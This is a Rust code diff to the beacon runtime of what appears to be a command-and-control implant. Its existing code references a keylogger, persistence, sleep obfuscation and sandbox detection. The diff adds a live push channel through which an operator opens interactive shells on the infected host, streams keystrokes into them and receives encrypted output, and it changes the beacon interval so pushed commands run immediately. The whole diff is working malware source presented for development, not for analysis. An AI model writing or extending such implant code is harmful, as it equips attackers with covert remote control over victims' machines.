@@ -7,7 +7,9 @@ use nw_profile::{
     config::GSocketConfig,
     crypto,
     envelope::{Envelope, Kind},
-    msgs::{FileAck, PollReply, PollRequest, Register, RegisterAck, Task, TaskResult},
+    msgs::{
+        FileAck, Live, LiveEvent, PollReply, PollRequest, Register, RegisterAck, Task, TaskResult,
+    },
 };
 use uuid::Uuid;
 
@@ -19,6 +21,7 @@ use crate::metadata;
 use crate::persistence;
 use crate::registry;
 use crate::runner;
+use crate::shell::{ShellOutput, ShellRegistry};
 use crate::tokens;
 use crate::transport::Transport;
 use crate::upload::Upload;
@@ -74,6 +77,10 @@ pub struct BeaconRuntime {
     >,
     /// Keyboard capture, owned by the beacon so it outlives one task.
     keylog: Arc<keylogger::KeylogState>,
+    /// Shells attached over the live channel, keyed by server-chosen id.
+    shells: ShellRegistry,
+    /// The operating system this implant runs on, used to pick a default shell.
+    host_os: String,
     stop: AtomicBool,
     failures: AtomicU32,
     sandboxed: AtomicBool,
@@ -425,6 +432,7 @@ impl BeaconRuntime {
         gsocket: Option<GSocketConfig>,
     ) -> Self {
         let key = crypto::derive_key(&psk, b"nw-m1-salt");
+        let host_os = profile.os.clone();
         let transport = Transport::from_profile(&profile.endpoint, gsocket).unwrap_or_else(|e| {
             tracing::warn!("bad endpoint {:?}: {e}", profile.endpoint);
             Transport::Http {
@@ -447,6 +455,8 @@ impl BeaconRuntime {
             #[cfg(test)]
             upload_install_barrier: Mutex::new(None),
             keylog: Arc::new(keylogger::KeylogState::new()),
+            shells: ShellRegistry::default(),
+            host_os,
             stop: AtomicBool::new(false),
             failures: AtomicU32::new(0),
             sandboxed: AtomicBool::new(false),
@@ -1351,6 +1361,162 @@ impl BeaconRuntime {
         self.pending.lock().unwrap().push(result);
     }
 
+    /// Seal one live-channel event and write it to the server.
+    ///
+    /// A dropped frame here is not fatal: the next beacon still reports task
+    /// results, and shell output that never arrives is output the operator
+    /// would rather not wait for.
+    fn emit_event(&self, event: LiveEvent) {
+        let Ok(plaintext) = serde_json::to_vec(&event) else {
+            return;
+        };
+        let key = *self.key.read().unwrap();
+        let id = self.next_id();
+        let Ok(encrypted) = crypto::encrypt(&key, id, &plaintext) else {
+            return;
+        };
+        let envelope = Envelope::new(Kind::Event, id, *self.session_id.read().unwrap(), encrypted);
+        let Ok(sealed) = envelope.seal(&key) else {
+            return;
+        };
+        let transport = self.transport.read().unwrap().clone();
+        if let Err(error) = transport.send_live(sealed.as_bytes()) {
+            tracing::debug!(%error, "live event dropped");
+        }
+    }
+
+    /// Apply one frame the server pushed on the live channel.
+    async fn handle_live(self: &Arc<Self>, live: Live) {
+        match live {
+            // A pushed task runs exactly like a polled one; its result still
+            // travels on the next beacon, so nothing about the ledger changes.
+            Live::Task { task } => {
+                self.accept_task(task.id);
+                let runtime = Arc::clone(self);
+                tokio::spawn(async move { runtime.execute(vec![task]).await });
+            }
+            Live::Kill { task_id } => {
+                let killed = self.kill_task(&task_id).await;
+                self.emit_event(LiveEvent::Killed { task_id, killed });
+            }
+            Live::ShellOpen {
+                shell_id,
+                program,
+                args,
+            } => self.open_shell(shell_id, program, args),
+            Live::ShellInput { shell_id, data } => {
+                if let Err(error) = self.shells.write(shell_id, data.as_bytes()) {
+                    tracing::debug!(%shell_id, %error, "shell input dropped");
+                    self.emit_event(LiveEvent::ShellExit {
+                        shell_id,
+                        code: None,
+                    });
+                }
+            }
+            Live::ShellClose { shell_id } => {
+                self.shells.close(shell_id);
+            }
+        }
+    }
+
+    fn open_shell(self: &Arc<Self>, shell_id: Uuid, program: String, args: Vec<String>) {
+        // An empty program means "give me a shell": pick the one this platform
+        // considers a login shell.
+        let (program, args) = if program.trim().is_empty() {
+            let (default, args) = crate::shell::default_program(&self.host_os);
+            (default.to_owned(), args)
+        } else {
+            (program, args)
+        };
+        let runtime = Arc::clone(self);
+        let sink: Arc<dyn Fn(ShellOutput) + Send + Sync> = Arc::new(move |output| match output {
+            ShellOutput::Data(bytes, stderr) => {
+                runtime.emit_event(LiveEvent::ShellData {
+                    shell_id,
+                    data: base64_encode(&bytes),
+                    stderr,
+                });
+            }
+            ShellOutput::Closed(code) => {
+                runtime.shells.close(shell_id);
+                runtime.emit_event(LiveEvent::ShellExit { shell_id, code });
+            }
+        });
+        match self.shells.open(shell_id, &program, &args, sink) {
+            Ok(pty) => {
+                tracing::info!(%shell_id, program = %program, pty, "shell attached");
+                self.emit_event(LiveEvent::ShellReady {
+                    shell_id,
+                    program,
+                    pty,
+                });
+            }
+            Err(error) => {
+                tracing::warn!(%shell_id, %error, "shell failed to start");
+                self.emit_event(LiveEvent::ShellExit {
+                    shell_id,
+                    code: None,
+                });
+            }
+        }
+    }
+
+    /// Wait out the beacon interval, or until the server pushes something.
+    ///
+    /// A kill or a keystroke must not wait out a sleep, so the interval and the
+    /// live channel race here. Every push is handled before the sleep ends, so
+    /// a burst of shell input is not dropped between beacons.
+    ///
+    /// The queue is borrowed, not taken: the beacon loop owns it for its whole
+    /// life, because dropping it would look to the carrier like a listener that
+    /// has gone away and would take the socket down with it.
+    async fn wait_for_tick(
+        self: &Arc<Self>,
+        sid: Uuid,
+        inbound: Option<&mut tokio::sync::mpsc::UnboundedReceiver<Vec<u8>>>,
+    ) {
+        let Some(inbound) = inbound else {
+            evasion::obfusleep(self.sleep()).await;
+            return;
+        };
+        let sleep = evasion::obfusleep(self.sleep());
+        tokio::pin!(sleep);
+        loop {
+            tokio::select! {
+                () = &mut sleep => break,
+                frame = inbound.recv() => {
+                    let Some(frame) = frame else {
+                        // The carrier dropped. Fall back to plain sleeping; the
+                        // next beacon reconnects and takes the channel again.
+                        break;
+                    };
+                    self.handle_live_frame(sid, &frame).await;
+                }
+            }
+        }
+    }
+
+    /// Open one pushed frame and dispatch it.
+    async fn handle_live_frame(self: &Arc<Self>, sid: Uuid, frame: &[u8]) {
+        let key = *self.key.read().unwrap();
+        let Ok(envelope) = Envelope::open(&key, std::str::from_utf8(frame).unwrap_or("")) else {
+            tracing::debug!("live frame was not for this session; ignoring");
+            return;
+        };
+        // A frame that names another session, or is an ordinary beacon reply,
+        // is not ours to act on.
+        if envelope.session_id != Some(sid) || envelope.kind != Kind::Push {
+            return;
+        }
+        let Ok(plaintext) = crypto::decrypt(&key, envelope.id, &envelope.encrypted) else {
+            return;
+        };
+        match serde_json::from_slice::<Live>(&plaintext) {
+            Ok(live) => self.handle_live(live).await,
+            Err(error) => tracing::debug!(%error, "unreadable live frame"),
+        }
+    }
+
     async fn finalize_upload(&self, ack: FileAck) {
         let Some((upload, control, task_id, destination, terminal_barriers)) = ({
             let mut slot = self.upload.write().unwrap();
@@ -1588,6 +1754,9 @@ impl BeaconRuntime {
     /// Own the beacon loop until signalled to stop.
     pub async fn run(self: Arc<Self>) -> anyhow::Result<()> {
         self.harden();
+        // Taken once, for the life of the loop: the carrier keeps the socket open
+        // because this queue stays readable between beacons.
+        let mut inbound = self.transport.read().unwrap().take_live_inbound();
         loop {
             if self.should_stop() {
                 tracing::info!("implant stop requested");
@@ -1599,6 +1768,9 @@ impl BeaconRuntime {
                 None => match self.register().await {
                     Ok(id) => {
                         *self.session_id.write().unwrap() = Some(id);
+                        // A re-registration is a new session: shells and state
+                        // from the old one belong to a key we no longer hold.
+                        self.shells.close_all();
                         id
                     }
                     Err(e) => {
@@ -1615,6 +1787,10 @@ impl BeaconRuntime {
                     }
                 },
             };
+
+            // A push can arrive at any moment, so the interval below is a race
+            // rather than an unconditional sleep.
+            self.wait_for_tick(sid, inbound.as_mut()).await;
 
             match self.poll(sid).await {
                 // Run the batch detached so long-running and short tasks
@@ -1637,13 +1813,17 @@ impl BeaconRuntime {
                     }
                 }
             }
-            evasion::obfusleep(self.sleep()).await;
         }
         Ok(())
     }
 }
 
 fn encode_key(k: &[u8]) -> String {
+    use base64::Engine;
+    base64::engine::general_purpose::STANDARD.encode(k)
+}
+
+fn base64_encode(k: &[u8]) -> String {
     use base64::Engine;
     base64::engine::general_purpose::STANDARD.encode(k)
 }
